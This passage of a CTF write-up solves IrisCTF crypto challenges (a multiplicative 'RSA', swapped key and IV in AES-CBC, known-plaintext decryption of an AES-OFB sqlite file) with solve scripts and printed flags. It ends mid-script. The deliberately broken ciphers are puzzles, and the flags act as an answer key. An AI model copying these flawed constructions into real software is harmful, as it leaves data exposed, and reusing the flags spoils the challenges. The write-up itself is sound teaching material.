      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-py&#34; &gt;&lt;code&gt;
from Crypto.Util.number import getStrongPrime

# We get 2 1024-bit primes
p = getStrongPrime(1024)
q = getStrongPrime(1024)

# We calculate the modulus
n = p*q

# We generate our encryption key
import secrets
e = secrets.randbelow(n)

# We take our input
flag = b&amp;#34;irisctf{REDACTED_REDACTED_REDACTED}&amp;#34;
assert len(flag) == 35
# and convert it to a number
flag = int.from_bytes(flag, byteorder=&amp;#39;big&amp;#39;)

# We encrypt our input
encrypted = (flag * e) % n

print(f&amp;#34;n: {n}&amp;#34;)
print(f&amp;#34;e: {e}&amp;#34;)
print(f&amp;#34;flag: {encrypted}&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;output.txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-txt&#34; &gt;&lt;code&gt;
n: 21429933885346644587620272790089165813353259223649897308397918491861562279767580488441831451651834802520437234248670652477414296159324726172158330221397420877323921934377321483041598028053870169281419856238830264612049920637819183013812186448416408328958360799645342598727238977986741643705720539702955864527935398839069236768630867447760912744208154645904678859979378604386855741350220991958191408182147658532111413386776058224418484895056146180001830405844881486308594953615999140110712045286000170660686758188247928230655746746482354748673482506070246808187808961599576834080344066055446605664648340486804023919467
e: 10788856448030235429585145974385410619185237539198378911887172763282204686697141640582780419040340318300048024100764883750608733331571719088729202796193207904701854848679412033514037149161609202467086017862616635522167577463675349103892366486246290794304652162107619408011548841664240624935414339021041162505899467159623692906986841033101688573177710503499081107294555688550493634416552587963816327790111808356639558596438537569271043190414208204773219496030644456745185896540608008662177117212000718802474957268532153146989410300300554162811564064457762004188326986236869603714437275058878379647196886872404148116134
flag: 3954523654845598592730156937269688140867480061118457307435945875579028695730063528424973907208923014508950419982702682082417623843946231057553311028711409093751376287876799688357176816093484535703797332422565021382453879908968161161537921292725907853309522100738603080298951279637316809695591295752657105226749125868510570125512146397480808774515489938198191435285342823923715673372695893409325086032930406554421670815433958591841773705563688270739343539481283865883427560667086249616210745997056621098406247201301461721906304555526293017773805845093545204570993288514598261070097976786800172141678030841959348372097

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Looking at the source, it looks like standard RSA, but noticed on this line:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# We encrypt our input&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (flag &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; e) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the &amp;ldquo;encryption&amp;rdquo; is not RSA, as it uses multiplication instead of exponentiation. This means we can calculate an &lt;a href=&#34;https://en.wikipedia.org/wiki/Modular_multiplicative_inverse&#34;&gt;inverse element&lt;/a&gt; \(k\) for \(e\) and \(n\) where \(e \times k = 1 \pmod{n}\).&lt;/p&gt;
&lt;p&gt;Then we multiply this (\(k\)) by &lt;code&gt;encrypted&lt;/code&gt; mod &lt;code&gt;n&lt;/code&gt; to recover the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21429933885346644587620272790089165813353259223649897308397918491861562279767580488441831451651834802520437234248670652477414296159324726172158330221397420877323921934377321483041598028053870169281419856238830264612049920637819183013812186448416408328958360799645342598727238977986741643705720539702955864527935398839069236768630867447760912744208154645904678859979378604386855741350220991958191408182147658532111413386776058224418484895056146180001830405844881486308594953615999140110712045286000170660686758188247928230655746746482354748673482506070246808187808961599576834080344066055446605664648340486804023919467&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10788856448030235429585145974385410619185237539198378911887172763282204686697141640582780419040340318300048024100764883750608733331571719088729202796193207904701854848679412033514037149161609202467086017862616635522167577463675349103892366486246290794304652162107619408011548841664240624935414339021041162505899467159623692906986841033101688573177710503499081107294555688550493634416552587963816327790111808356639558596438537569271043190414208204773219496030644456745185896540608008662177117212000718802474957268532153146989410300300554162811564064457762004188326986236869603714437275058878379647196886872404148116134&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3954523654845598592730156937269688140867480061118457307435945875579028695730063528424973907208923014508950419982702682082417623843946231057553311028711409093751376287876799688357176816093484535703797332422565021382453879908968161161537921292725907853309522100738603080298951279637316809695591295752657105226749125868510570125512146397480808774515489938198191435285342823923715673372695893409325086032930406554421670815433958591841773705563688270739343539481283865883427560667086249616210745997056621098406247201301461721906304555526293017773805845093545204570993288514598261070097976786800172141678030841959348372097&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(e,&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,n)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (encrypted &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(long_to_bytes(flag))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;irisctf{discrete_divide_isn&#39;t_hard}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;babymixup---98-solves&#34;&gt;babymixup - 98 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I encrypted a public string and the flag with AES. There&amp;rsquo;s no known key recovery attacks against AES, so you can&amp;rsquo;t decrypt the flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Given source and output:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;chal.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-py&#34; &gt;&lt;code&gt;
from Crypto.Cipher import AES
import os

key = os.urandom(16)

flag = b&amp;#34;flag{REDACTED}&amp;#34;
assert len(flag) % 16 == 0

iv = os.urandom(16)
cipher = AES.new(iv,  AES.MODE_CBC, key)
print(&amp;#34;IV1 =&amp;#34;, iv.hex())
print(&amp;#34;CT1 =&amp;#34;, cipher.encrypt(b&amp;#34;Hello, this is a public message. This message contains no flags.&amp;#34;).hex())

iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv )
print(&amp;#34;IV2 =&amp;#34;, iv.hex())
print(&amp;#34;CT2 =&amp;#34;, cipher.encrypt(flag).hex())
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;output.txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-txt&#34; &gt;&lt;code&gt;
IV1 = 4ee04f8303c0146d82e0bbe376f44e10
CT1 = de49b7bb8e3c5e9ed51905b6de326b39b102c7a6f0e09e92fe398c75d032b41189b11f873c6cd8cdb65a276f2e48761f6372df0a109fd29842a999f4cc4be164
IV2 = 1fe31329e7c15feadbf0e43a0ee2f163
CT2 = f6816a603cefb0a0fd8a23a804b921bf489116fcc11d650c6ffb3fc0aae9393409c8f4f24c3d4b72ccea787e84de7dd0
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;As shown, &lt;code&gt;key&lt;/code&gt; and &lt;code&gt;iv&lt;/code&gt; are completely random, but &lt;code&gt;key&lt;/code&gt; is re-used for both encryptions of &lt;code&gt;P1&lt;/code&gt; (&lt;code&gt;b&amp;quot;Hello, this ...&amp;quot;&lt;/code&gt;) and &lt;code&gt;P2&lt;/code&gt; (the flag).&lt;/p&gt;
&lt;p&gt;We also spot an error with the code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(iv,  AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_CBC, key)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_CBC, iv )
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;key&lt;/code&gt; and &lt;code&gt;iv&lt;/code&gt; are swapped for the first operation! For reference, the function is supposed to be &lt;code&gt;AES.new(key, AES mode, IV)&lt;/code&gt;. Let&amp;rsquo;s see how we can exploit this.&lt;/p&gt;
&lt;p&gt;With all block cipher puzzles, it helps to use a diagram that illustrates their decryption scheme. In this case it&amp;rsquo;s &lt;code&gt;AES-CBC&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/1200px-CBC_decryption.svg.png&#34;  alt=&#34;wikipedia diagram of AES-CBC decryption&#34;  class=&#34;center&#34;  style=&#34;filter: invert(100%) sepia(100%) saturate(0%) hue-rotate(327deg) brightness(104%) contrast(101%);&#34;  /&gt;


&lt;p&gt;We have &lt;code&gt;IV1&lt;/code&gt; and &lt;code&gt;IV2&lt;/code&gt; from the output, but &lt;code&gt;IV1&lt;/code&gt; is actually the key used to encrypt &lt;code&gt;CT1&lt;/code&gt;. We can figure out the actual &lt;code&gt;IV&lt;/code&gt; for &lt;code&gt;CT1&lt;/code&gt; by looking at the diagram - notice that to decrypt, &lt;code&gt;CT1&lt;/code&gt; is decrypted using the &lt;code&gt;key&lt;/code&gt; then XOR&amp;rsquo;ed with the &lt;code&gt;IV&lt;/code&gt;, and since we know &lt;code&gt;P1&lt;/code&gt; (the plaintext), by properties of XOR, figuring out the &lt;code&gt;IV&lt;/code&gt; is just decrypting without an IV then XORing with the plaintext.&lt;/p&gt;
&lt;p&gt;Recall that &lt;code&gt;real_IV1&lt;/code&gt; is actually the key used to encrypt our flag &lt;code&gt;CT2&lt;/code&gt;, so we now have the key to decrypt the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; binascii &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unhexlify
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(a,b):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([x&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;y &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x,y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(a,b)])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IV1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4ee04f8303c0146d82e0bbe376f44e10&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CT1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;de49b7bb8e3c5e9ed51905b6de326b39b102c7a6f0e09e92fe398c75d032b41189b11f873c6cd8cdb65a276f2e48761f6372df0a109fd29842a999f4cc4be164&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IV2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1fe31329e7c15feadbf0e43a0ee2f163&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CT2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f6816a603cefb0a0fd8a23a804b921bf489116fcc11d650c6ffb3fc0aae9393409c8f4f24c3d4b72ccea787e84de7dd0&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(unhexlify(IV1), AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_CBC, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;real_IV1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(unhexlify(CT1)), &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello, this is a public message. This message contains no flags.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;real_IV1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; real_IV1[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# only first block, IVs are 16 bytes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(real_IV1, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_CBC, unhexlify(IV2))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(unhexlify(CT2)))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;irisctf{the_iv_aint_secret_either_way_using_cbc}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;nonces-and-keys---53-solves&#34;&gt;Nonces and Keys - 53 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Because of our revolutionary AES-128-OFB technology we have encrypted your user data so securely that even with the key (k=0x13371337133713371337133713371337) evil hackers can&amp;rsquo;t read out the passwords!!!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are provided with an encrypted sqlite3 file &lt;code&gt;challenge_enc.sqlite3&lt;/code&gt;. Our goal is to decrypt it.&lt;/p&gt;
&lt;p&gt;Already given in the challenge description, the key is &lt;code&gt;0x13371337133713371337133713371337&lt;/code&gt; and the file is encrypted using &lt;code&gt;AES-128-OFB&lt;/code&gt;. Again, we can pull up a diagram.&lt;/p&gt;

  &lt;img src=&#34;https://upload.wikimedia.org/wikipedia/commons/thumb/f/f5/OFB_decryption.svg/1202px-OFB_decryption.svg.png&#34;  alt=&#34;wikipedia diagram for AES-OFB decryption&#34;  class=&#34;center&#34;  style=&#34;filter: invert(100%) sepia(100%) saturate(0%) hue-rotate(327deg) brightness(104%) contrast(101%);&#34;  /&gt;


&lt;p&gt;&lt;code&gt;AES-OFB&lt;/code&gt; being a stream cipher, encryption and decryption are identical. But the more important thing to notice is that we can recover the stream for cipher using known plaintext! Notice that if we have a block of known plaintext &lt;code&gt;P1&lt;/code&gt; and ciphertext &lt;code&gt;C1&lt;/code&gt;, &lt;code&gt;P1&lt;/code&gt; xor &lt;code&gt;C1&lt;/code&gt; will give us the stream (Key and IV encryption). Furthermore, this stream is used as the &amp;ldquo;IV&amp;rdquo; for the next block, and since we have the key already, we can decrypt every subsequent block.&lt;/p&gt;
&lt;p&gt;Now all we need is a block of known plaintext. A quick google search brings us to the sqlite3 magic bytes &lt;code&gt;53514c69746520666f726d6174203300&lt;/code&gt;, which is conveniently 16 bytes - a full block!&lt;/p&gt;
&lt;p&gt;From there we script the decryption of the rest of the blocks, and CTRL+F the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; binascii &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unhexlify
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;challenge_enc.sqlite3&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    enc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(a,b):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([x&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;y &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x,y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(a,b)])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13371337133713371337133713371337&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;53514c69746520666f726d6174203300&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# sqlite3 magic bytes &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plaintext &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# loop that keeps using the previous stream as IV and decrypting&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(enc)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; enc[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(p1, len(p1))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    e1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(c1, p1)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; enc[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ofb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_OFB, e1)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ofb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(c2)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
